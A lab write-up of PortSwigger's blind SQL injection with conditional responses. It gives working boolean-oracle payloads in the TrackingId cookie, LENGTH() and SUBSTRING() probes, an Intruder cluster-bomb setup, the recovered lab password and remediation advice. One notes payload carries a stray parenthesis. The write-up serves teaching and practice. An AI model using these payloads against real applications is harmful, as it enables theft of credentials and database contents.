# Blind SQL injection with conditional responses

**Category:** SQL injection
**Level:** Practitioner
**Mechanism:** Boolean-based blind — infer data one bit at a time from a conditional page change

**Lab URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

## Vulnerability

The `TrackingId` cookie is concatenated into a SQL query. The query results aren't shown
and there are no error messages, but the page renders a **"Welcome back"** message only when
the query returns rows. That single observable difference turns the injection into a boolean
oracle: any true/false condition can be tested by whether "Welcome back" appears, and the
administrator's password can be extracted character by character.

## Reconnaissance & Exploitation

The injectable sink is the cookie:

```http
Cookie: TrackingId=M6jHkhMaYHEKnerg; session=...
```

**Confirm the oracle.** A true condition shows "Welcome back"; a false one doesn't:

```
TrackingId=M6jHkhMaYHEKnerg' AND '1'='1     → "Welcome back" present   (true)
TrackingId=M6jHkhMaYHEKnerg' AND '1'='2     → "Welcome back" absent    (false)
```

**Confirm the data exists.** The `users` table and the `administrator` row:

```
' AND (SELECT 'a' FROM users LIMIT 1)='a                              → true (table exists)
' AND (SELECT 'a' FROM users WHERE username='administrator')='a       → true (user exists)
```

**Find the password length** with `LENGTH()`, incrementing until the condition flips false:

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a   → true
...
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a  → true
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a  → false
```

Length = **20**.

**Extract each character** with `SUBSTRING()`, using Intruder to brute the value at every
position. Cluster bomb with two payload positions — position 1 = character index (1–20),
position 2 = the character guess (a–z, 0–9) — and a Grep-Match on `Welcome back` to flag the
hit:

```
TrackingId=M6jHkhMaYHEKnerg' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

The row with the "Welcome back" tick at each index gives that character. Sorted by position,
the matches spelled out the password:

```
i9zqs385125m8xvv026m
```

Logging in as `administrator` with that password solved the lab.

## Impact

Full disclosure of the administrator's credentials — and, by the same technique, any data in
the database — despite the application returning no query output and no errors. A single
boolean side-channel ("Welcome back" vs not) is enough to read the entire database one bit
at a time, leading to account takeover and total data compromise.

## Remediation

- Use **parameterised queries** (prepared statements) for the `TrackingId` value, so input is
  treated as data and can never alter the query. This is the root fix for every injection
  class in this repo.
- Don't vary the response on back-end query results in a way that leaks a boolean; but note
  that masking the oracle is mitigation, not a fix — the injection itself must be closed.
- Apply least privilege to the DB account so a compromised query can't read sensitive tables.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-89 (SQL Injection); CWE-200 (Exposure of Sensitive Information)

## Notes

- "Blind" = no data in the response, so you build an **oracle**: one observable that differs
  between true and false (here the "Welcome back" text). Everything is inferred from it.
- Workflow is always the same for boolean blind: confirm the oracle (`'1'='1` vs `'1'='2`) →
  confirm the target exists → find length with `LENGTH()>n` → read chars with
  `SUBSTRING(col,pos,1)`.
- Cluster bomb (two positions, all permutations) extracts all 20 chars in one attack:
  20 positions × 36 chars = 720 requests. Runs in Community (throttled but fine; no
  Collaborator needed).
- Gotcha: a position can show **two** "Welcome back" hits (a false positive). Resolve it with
  a single targeted Repeater check: `SUBSTRING(password,20,1))='m` — the one that returns the
  message is the real character.
- Scales up with a binary search (compare against the midpoint of the charset with `>`)
  instead of testing every character, cutting ~36 guesses per position down to ~6.